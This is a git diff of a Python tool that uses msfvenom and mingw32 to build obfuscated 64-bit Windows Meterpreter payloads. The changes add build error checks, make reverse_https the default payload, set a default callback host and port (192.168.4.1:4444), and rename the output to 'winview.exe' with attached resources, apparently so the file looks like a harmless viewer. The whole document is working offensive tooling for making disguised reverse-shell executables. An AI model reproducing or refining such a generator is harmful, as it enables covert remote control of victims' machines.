@@ -155,12 +155,16 @@ def build_payload(output = 'payload.exe', resource = None):
         raise Exception('build failed with error: ' + str(ret))
 
     if resource:
+        print "[+] Adding ressources"
         ret = os.system('x86_64-w64-mingw32-windres -F pe-x86-64 ' + resource + ' resources.o')
 
         if ret != 0:
             raise Exception('build failed with error: ' + str(ret))
 
         ret = os.system('x86_64-w64-mingw32-gcc -mwindows resources.o payload.o -o ' + output)
+
+        if ret != 0:
+            raise Exception('build failed with error: ' + str(ret))
 
         os.remove('resources.o')
     else:
@@ -179,18 +183,18 @@ def strip_payload(output = 'payload.exe'):
     if ret != 0:
         raise Exception('strip failed with error: ' + str(ret))
 
-def generate(lhost, lport, payload = 'windows/x64/meterpreter/reverse_tcp', resource = None, output = 'winplayer.exe'):
+def generate(lhost, lport, payload, resource, output):
     generate_payload(lhost, lport,payload)
     build_payload(output, resource)
     strip_payload(output)
 
 def main():
     parser = argparse.ArgumentParser(description='Generate an objuscated payload in 64 bit using msfvenom and mingw32.')
-    parser.add_argument('-p', '--payload', default='windows/x64/meterpreter/reverse_tcp', type=str, help='metasploit payload')
-    parser.add_argument('lhost', type=str, help='Host IP Address')
-    parser.add_argument('lport', type=int, help="Listenning port")
-    parser.add_argument('-o', '--output', default='payload.exe', help='Output PE name')
-    parser.add_argument('-r', '--resource', help='Resource file')
+    parser.add_argument('-p', '--payload', default='windows/x64/meterpreter/reverse_https', type=str, help='metasploit payload')
+    parser.add_argument('lhost', type=str, default="192.168.4.1", help='Host IP Address')
+    parser.add_argument('lport', type=int, default="4444", help="Listenning port")
+    parser.add_argument('-o', '--output', default='winview.exe', help='Output PE name')
+    parser.add_argument('-r', '--resource', default="ressources.rc", help='Resource file')
 
     args = parser.parse_args()
 
